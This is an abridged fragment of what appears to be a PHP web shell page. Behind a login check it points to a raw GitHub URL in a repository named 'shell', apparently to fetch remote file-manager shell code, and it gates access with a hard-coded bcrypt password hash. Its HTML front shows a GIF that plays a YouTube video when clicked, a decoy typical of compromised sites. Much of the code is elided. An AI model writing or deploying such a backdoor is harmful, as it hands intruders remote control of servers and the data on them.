...
if (is_logged_in()) {
    ...
    $b0rn = 'https://raw.githubusercontent.com/lyyahm/shell/refs/heads/main/fm33.txt';
    ...
    if (isset($_POST['password'])) { 
        ...
        $hashed_key = '$2y$10$m4W9BHBf4OgVcTHN85OHT.sB3zDmknoLI6Sow8nkO68CUSQ41ZC9C'; // https://bcrypt.online/ 
...
<html lang="en">
      ...
      document.addEventListener("DOMContentLoaded", function () {
        ...
        clickableImage.addEventListener("click", function () {
          if (!linkContainer.innerHTML) {
            ...
            youtubePlayer.src =
              "https://www.youtube.com/embed/7DFlyDYAt1c?autoplay=1&loop=1&playlist=7DFlyDYAt1c";
  ...
  <body>
    <div class="container">
      <img
        id="clickableImage"
        src="https://c.tenor.com/gNgtEpVk_fUAAAAC/tenor.gif"
        width="300"
